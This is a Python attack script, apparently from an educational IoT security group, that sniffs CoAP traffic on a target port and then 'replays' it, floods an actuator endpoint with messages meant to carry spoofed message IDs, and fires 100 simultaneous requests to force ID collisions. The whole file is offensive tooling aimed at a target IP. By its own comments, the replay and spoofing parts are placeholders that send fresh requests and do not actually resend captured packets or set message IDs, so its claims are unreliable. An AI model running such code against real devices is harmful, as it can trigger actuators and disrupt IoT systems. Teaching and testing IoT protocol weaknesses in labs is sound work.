#!/usr/bin/env python3
"""
CoAP Message ID Spoofing & Replay Attack
Intercepta e replica mensagens CoAP
Para fins educacionais - GT-IoTEdu
"""

import asyncio
import sys
import time
from aiocoap import *
from scapy.all import sniff, UDP, Raw
import random
import struct

attack_stats = {
    'messages_captured': 0,
    'replay_sent': 0,
    'spoofed_messages': 0,
    'collisions_forced': 0
}

captured_messages = []

class CoAPReplayAttacker:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port
        self.target = f"coap://{target_host}:{target_port}"
    
    def packet_callback(self, packet):
        """Callback para captura de pacotes CoAP"""
        if UDP in packet and packet[UDP].dport == self.target_port:
            if Raw in packet:
                coap_data = bytes(packet[Raw])
                
                # Parse CoAP header básico (4 bytes mínimo)
                if len(coap_data) >= 4:
                    # CoAP Header: Ver(2bit)|Type(2bit)|TKL(4bit) | Code(8bit) | Message ID(16bit)
                    message_id = struct.unpack('!H', coap_data[2:4])[0]
                    
                    captured_messages.append({
                        'raw_data': coap_data,
                        'message_id': message_id,
                        'src_ip': packet.src,
                        'dst_ip': packet.dst,
                        'timestamp': time.time()
                    })
                    
                    attack_stats['messages_captured'] += 1
                    
                    print(f"[📡] Capturada mensagem CoAP: MID={message_id} de {packet.src}")
    
    async def sniff_and_capture(self, duration=30):
        """Captura tráfego CoAP por X segundos"""
        
        print(f"\n[*] Sniffing tráfego CoAP na porta {self.target_port} por {duration}s...")
        print("[*] Aguardando mensagens CoAP...\n")
        
        # Sniff assíncrono (simplificado - em produção usar threading)
        filter_str = f"udp and port {self.target_port}"
        
        # Sniff por duração limitada
        sniff(
            filter=filter_str,
            prn=self.packet_callback,
            timeout=duration,
            store=0
        )
        
        print(f"\n[✓] Captura completa: {len(captured_messages)} mensagens CoAP capturadas\n")
    
    async def replay_captured_messages(self, replay_count=10):
        """Replica mensagens capturadas"""
        
        if not captured_messages:
            print("[!] Nenhuma mensagem capturada para replay")
            return
        
        print(f"\n[*] Iniciando replay de {len(captured_messages)} mensagens ({replay_count}x cada)...\n")
        
        for msg_data in captured_messages:
            print(f"[!] Replicando MID={msg_data['message_id']} {replay_count} vezes...")
            
            for i in range(replay_count):
                try:
                    # Envia raw CoAP packet (requer socket UDP direto)
                    # Simplificado aqui - usa aiocoap para demonstração
                    
                    protocol = await Context.create_client_context()
                    
                    # Tenta replicar request (sem acesso direto a Message ID em aiocoap)
                    # Em implementação real, usaria socket UDP raw
                    
                    request = Message(code=GET, uri=self.target)
                    await protocol.request(request).response
                    
                    attack_stats['replay_sent'] += 1
                    
                except Exception as e:
                    pass
            
            print(f"[✓] Replay de MID={msg_data['message_id']} completado")
            await asyncio.sleep(0.5)
    
    async def message_id_spoofing(self, num_messages=200):
        """Envia mensagens com Message IDs previsíveis/manipulados"""
        
        print(f"\n[*] Enviando {num_messages} mensagens com Message IDs spoofed...\n")
        
        protocol = await Context.create_client_context()
        
        # Message IDs comuns/previsíveis
        predictable_mids = [
            0x0000, 0x0001, 0x0002,  # Sequenciais
            0xFFFF, 0xFFFE, 0xFFFD,  # Máximos
            0x1234, 0x5678, 0xABCD,  # Padrões
        ]
        
        for mid in predictable_mids:
            for _ in range(10):
                try:
                    # aiocoap não expõe controle direto de Message ID
                    # Demonstração conceitual
                    
                    request = Message(code=POST, uri=f"{self.target}/actuator/trigger")
                    request.payload = f"Spoofed_MID_{mid:04X}".encode()
                    
                    await protocol.request(request).response
                    
                    attack_stats['spoofed_messages'] += 1
                    
                    print(f"[!] Spoofed message enviada (MID simulado: 0x{mid:04X})")
                    
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)
    
    async def message_id_collision_attack(self):
        """Força colisões de Message ID"""
        
        print("\n[*] Forçando colisões de Message ID...\n")
        
        protocol = await Context.create_client_context()
        
        # Envia múltiplas mensagens simultaneamente
        # Aumenta chance de colisão de MID
        
        tasks = []
        for i in range(100):
            request = Message(code=GET, uri=f"{self.target}/sensor/data")
            task = protocol.request(request).response
            tasks.append(task)
        
        # Envia todas ao mesmo tempo
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        attack_stats['collisions_forced'] = len([r for r in results if not isinstance(r, Exception)])
        
        print(f"[✓] {attack_stats['collisions_forced']} mensagens enviadas simultaneamente")
        print("[!] Probabilidade de colisão de MID aumentada")
    
    async def launch_attack(self, mode):
        """Lança ataque baseado no modo"""
        
        print("\n[*] Iniciando CoAP Message ID Replay/Spoof Attack...\n")
        
        if mode == "replay":
            # Modo Replay: Captura + Replica
            await self.sniff_and_capture(duration=30)
            await asyncio.sleep(2)
            await self.replay_captured_messages(replay_count=10)
        
        elif mode == "spoof":
            # Modo Spoof: Message ID manipulation
            await self.message_id_spoofing(num_messages=200)
            await asyncio.sleep(2)
            await self.message_id_collision_attack()
        
        # Relatório final
        print("\n" + "=" * 70)
        print("[✓] CoAP Message ID Attack Completado!")
        print("=" * 70)
        print(f"[✓] Mensagens capturadas: {attack_stats['messages_captured']}")
        print(f"[✓] Replays enviados: {attack_stats['replay_sent']}")
        print(f"[✓] Mensagens spoofed: {attack_stats['spoofed_messages']}")
        print(f"[✓] Colisões forçadas: {attack_stats['collisions_forced']}")
        print("=" * 70)

async def main():
    if len(sys.argv) < 4:
        print("Uso: python3 attack.py <target_ip> <target_port> <mode>")
        print("\nModos:")
        print("  replay - Captura e replica mensagens CoAP")
        print("  spoof  - Envia mensagens com MIDs manipulados")
        print("\nExemplo: python3 attack.py 172.17.0.2 5683 replay")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    mode = sys.argv[3].lower()
    
    if mode not in ['replay', 'spoof']:
        print("[✗] Modo inválido. Use 'replay' ou 'spoof'")
        sys.exit(1)
    
    print("=" * 70)
    print("  CoAP MESSAGE ID REPLAY/SPOOF - Educational Purpose Only")
    print("  GT-IoTEdu - Grupo de Trabalho IoT Educacional")
    print("=" * 70)
    print(f"[*] Alvo: {target_host}:{target_port}")
    print(f"[*] Modo: {mode.upper()}")
    print(f"[*] Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    if mode == "replay":
        print("\n[!] AVISO: Modo replay requer --network=host e --cap-add=NET_RAW")
    
    attacker = CoAPReplayAttacker(target_host, target_port)
    await attacker.launch_attack(mode)

if __name__ == "__main__":
    asyncio.run(main())